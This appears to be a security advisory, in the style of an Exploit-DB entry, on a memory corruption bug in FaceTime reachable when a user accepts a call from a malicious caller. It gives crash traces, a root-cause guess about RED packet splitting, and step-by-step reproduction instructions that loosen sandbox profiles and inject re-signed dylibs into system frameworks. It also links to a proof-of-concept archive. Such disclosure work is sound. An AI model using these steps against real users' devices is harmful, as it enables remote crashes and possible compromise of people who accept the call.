@@ -1,0 +1,129 @@
+There is a memory corruption issue that occurs when processing a malformed RTP video stream in FaceTime. It appears to be related to processing textures.
+
+* thread #7, stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+  * frame #0: 0x00007fff56baaa92 CoreVideo`CVMetalTextureBacking::releaseBackingUsage() + 20
+    frame #1: 0x00007fff56bae4c4 CoreVideo`CVMetalTextureCache::bufferBackingNotInUse(CVBufferBacking*) + 258
+    frame #2: 0x00007fff56b9eac5 CoreVideo`CVBufferBacking::releaseUsage() + 79
+    frame #3: 0x00007fff56bab20e CoreVideo`CVMetalTexture::finalize() + 42
+    frame #4: 0x00007fff55093e7c CoreFoundation`_CFRelease + 284
+    frame #5: 0x00007fff617bdac5 VideoToolbox`VTMetalTransferSessionTransferImageSync + 3096
+    frame #6: 0x00007fff6176f4fb VideoToolbox`VTPixelTransferSessionTransferImage + 11922
+    frame #7: 0x000000010629b3cb CMIOUnits`___lldb_unnamed_symbol331$$CMIOUnits + 773
+    frame #8: 0x000000010629909e CMIOUnits`___lldb_unnamed_symbol325$$CMIOUnits + 1868
+    frame #9: 0x0000000106297aa4 CMIOUnits`___lldb_unnamed_symbol322$$CMIOUnits + 5338
+    frame #10: 0x000000010630bb3b CMIOUnits`___lldb_unnamed_symbol1297$$CMIOUnits + 347
+    frame #11: 0x000000010627fda7 CMIOUnits`___lldb_unnamed_symbol193$$CMIOUnits + 267
+    frame #12: 0x00000001062bf2bb CMIOUnits`___lldb_unnamed_symbol630$$CMIOUnits + 26
+    frame #13: 0x00000001062f8061 CMIOUnits`___lldb_unnamed_symbol1126$$CMIOUnits + 65
+    frame #14: 0x000000010630bac0 CMIOUnits`___lldb_unnamed_symbol1297$$CMIOUnits + 224
+    frame #15: 0x000000010627fda7 CMIOUnits`___lldb_unnamed_symbol193$$CMIOUnits + 267
+    frame #16: 0x00000001062bf2bb CMIOUnits`___lldb_unnamed_symbol630$$CMIOUnits + 26
+    frame #17: 0x00000001062f8061 CMIOUnits`___lldb_unnamed_symbol1126$$CMIOUnits + 65
+    frame #18: 0x0000000106316e34 CMIOUnits`___lldb_unnamed_symbol1387$$CMIOUnits + 376
+    frame #19: 0x000000010627fda7 CMIOUnits`___lldb_unnamed_symbol193$$CMIOUnits + 267
+    frame #20: 0x0000000106317612 CMIOUnits`___lldb_unnamed_symbol1392$$CMIOUnits + 54
+    frame #21: 0x00000001062c009c CMIOUnits`___lldb_unnamed_symbol654$$CMIOUnits + 55
+    frame #22: 0x00007fff560868c9 CoreMediaIO`CMIOGraph::PullOutputUnits(bool, bool&, bool&, bool&) + 279
+    frame #23: 0x00007fff56086eee CoreMediaIO`CMIOGraph::DoWork(unsigned int) + 836
+    frame #24: 0x00007fff56089543 CoreMediaIO`CMIO::Thread::QueuedTWorkThread<unsigned int>::DoWork() + 125
+    frame #25: 0x00007fff56092c67 CoreMediaIO`CMIO::Thread::SignaledThread::ThreadLoop() + 227
+    frame #26: 0x00007fff56092b5a CoreMediaIO`CMIO::Thread::SignaledThread::WorkQueuedThreadCallback(void*) + 154
+    frame #27: 0x00007fff55f6c98b CoreMedia`figThreadMain + 277
+    frame #28: 0x00007fff7d10c661 libsystem_pthread.dylib`_pthread_body + 340
+    frame #29: 0x00007fff7d10c50d libsystem_pthread.dylib`_pthread_start + 377
+    frame #30: 0x00007fff7d10bbf9 libsystem_pthread.dylib`thread_start + 13
+(lldb) down
+frame #0: 0x00007fff56baaa92 CoreVideo`CVMetalTextureBacking::releaseBackingUsage() + 20
+CoreVideo`CVMetalTextureBacking::releaseBackingUsage:
+->  0x7fff56baaa92 <+20>: jmpq   *0x48(%rax)
+    0x7fff56baaa95 <+23>: popq   %rbp
+    0x7fff56baaa96 <+24>: retq   
+    0x7fff56baaa97 <+25>: nop    
+
+Additional crash dumps are attached.
+
+This bug can be reached if a user accepts a call from a malicious caller. This issue only affects FaceTime on iOS and Mac. I tested on iOS 12.1.1 and Mac OS X 10.13.6.
+
+To reproduce issue on a Mac:
+
+1) Add the line:
+
+	(subpath "/out")
+
+to the (allow file-read* file-write* section of  /System/Library/Sandbox/Profiles/com.apple.avconferenced.sb 
+
+2) Add the line:
+
+	(allow file-read* file-write*
+		(subpath "/out"))
+
+to com.apple.identityservicesd.sb and restart the host
+
+
+3) Compile video-replay-avc.cpp using:
+
+	g++ -std=c++11 -g -dynamiclib -o librecord.so video-replay-avc.cpp
+
+4) Copy the output lib, librecord.so to /usr/lib/libSP.so
+
+5) Sign the library by calling:
+
+	sudo codesign -f -s - /usr/lib/libSP.so
+
+6) Compile video-replay-identity.cpp using:
+
+	g++ -std=c++11 -g -dynamiclib -o librecord_IDS.so video-replay-identity.cpp
+
+7) Copy the output lib, librecord_IDS.so to /usr/lib/libSP_IDS.so
+
+8) Sign the library by calling:
+
+	sudo codesign -f -s - /usr/lib/libSP_IDS.so
+
+9) Download and build https://github.com/Tyilo/insert_dylib
+
+10) Copy /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference to a local directory and run the command below.
+
+	insert_dylib --strip-codesig /usr/lib/libSP.so AVConference
+
+11) Copy AVConference_patched to /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference
+
+12) Sign the binary by calling:
+
+	sudo codesign -f -s - /System/Library/PrivateFrameworks/AVConference.framework/Versions/Current/AVConference
+
+13) Copy /System/Library/PrivateFrameworks/IDSFoundation.framework/Versions/Current/IDSFoundation to a local directory and run the command below.
+
+	insert_dylib --strip-codesig /usr/lib/libSP_IDS.so IDSFoundation
+
+14) Run the following commands, quickly, in sequence:
+
+	sudo cp IDSFoundation_patched /System/Library/PrivateFrameworks/IDSFoundation.framework/Versions/Current/IDSFoundation
+	sudo codesign -f -s - /System/Library/PrivateFrameworks/IDSFoundation.framework/Versions/Current/IDSFoundation
+
+NOTE: If you are too slow, the terminal may crash because it detects IDSFoundation is unsigned. If this happens, open up the terminal and try the codesign call again. The terminal usually stays open a second or two before it crashes.
+
+15) Extract out.zip into /out and make it world readable
+
+16) Kill the avconferenced and identityservicesd processes. They will restart automatically
+
+17) Make a FaceTime call to the target.
+
+I performed these steps on a MacBook Air running 10.14.1
+
+Taking a second look at this, the root cause of this issue is probably an overflow in splitting RED packets:
+
+0   libsystem_platform.dylib      	0x00007fff7d106164 _platform_memmove$VARIANT$Haswell + 580
+1   com.apple.AVConference        	0x00007fff646cb3f9 VCAudioRedBuilder_UpdateAudioPacketWithRedPayload + 50
+2   com.apple.AVConference        	0x00007fff6486360b _VCAudioReceiver_SplitRedPacket + 166
+3   com.apple.AVConference        	0x00007fff648646e7 _VCAudioReceiver_ProcessRTPPacket + 140
+4   com.apple.AVConference        	0x00007fff64861c40 _VCAudioReceiver_ReceiveProc + 272
+5   com.apple.AVConference        	0x00007fff64824db1 VCRealTimeThread_ThreadProc + 601
+6   com.apple.CoreMedia           	0x00007fff55f6c98b figThreadMain + 277
+7   libsystem_pthread.dylib       	0x00007fff7d10c661 _pthread_body + 340
+8   libsystem_pthread.dylib       	0x00007fff7d10c50d _pthread_start + 377
+9   libsystem_pthread.dylib       	0x00007fff7d10bbf9 thread_start + 13
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46433.zip
